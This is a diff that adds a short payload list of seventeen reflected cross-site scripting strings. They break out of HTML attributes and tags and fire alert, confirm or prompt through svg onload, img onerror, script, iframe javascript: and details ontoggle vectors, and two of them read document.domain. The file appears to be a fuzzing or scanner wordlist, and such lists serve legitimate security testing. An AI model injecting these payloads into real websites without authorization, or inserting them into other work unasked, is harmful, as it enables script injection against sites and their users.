@@ -1,0 +1,17 @@
+"><svg/onload=alert(1)>
+"><img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+"><script>confirm(1)</script>
+"><script>prompt(1)</script>
+"><body onload=alert(1)>
+"><iframe src=javascript:alert(1)>
+"><svg><script>alert(1)</script>
+"><img src=x: onerror=alert(1)>
+"><details open ontoggle=alert(1)>
+" autofocus onfocus=alert(1) x="
+'"><svg/onload=alert(1)>
+'"><img src=x onerror=alert(1)>
+'"><script>alert(1)</script>
+</script><script>alert(1)</script>
+"><svg/onload=alert(document.domain)>
+"><img src=x onerror=alert(document.domain)>
